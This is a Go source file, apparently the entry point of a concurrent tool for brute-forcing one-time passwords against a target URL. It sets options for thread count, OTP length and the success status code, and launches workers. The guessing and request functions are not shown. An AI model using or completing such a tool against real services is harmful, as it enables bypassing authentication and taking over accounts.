package main

import (
	"flag"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"sync"
)

type body struct {
	otherData map[string]string
}

type app struct {
	logger       *slog.Logger
	url          string
	body         body
	method       string
	workers      int
	length       int
	stopHttpCode int
	client       *http.Client //to reuse the same client over muntiple req for keep alive and not a lot off ssl handshake
}

func main() {

	maxIdealCons := 300
	wg := sync.WaitGroup{}

	var app app
	app.client = &http.Client{
		Transport: &http.Transport{
			MaxIdleConns: maxIdealCons,
		},
	}

	flag.StringVar(&app.url, "url", "none", "The url")
	flag.StringVar(&app.method, "method", "POST", "The method to be using")
	flag.IntVar(&app.workers, "t", 10, "The threads to be used")
	flag.IntVar(&app.length, "l", 4, "The length of the otp")
	flag.IntVar(&app.stopHttpCode, "s", 200, "Enter the match http status code for matched otp")
	flag.Parse()
	logger := slog.New(slog.NewTextHandler(os.Stdout, nil))
	app.logger = logger

	otp := make(chan string, app.workers*3)

	fmt.Printf("Working with %d many gouroutine", app.workers)

	for i := range app.workers {
		wg.Add(1)
		go app.callRequest(i, otp, &wg)
	}

	app.generateOtp(otp) //if you run this as gorotine add wg.Add(1) for this too

	wg.Wait()
}
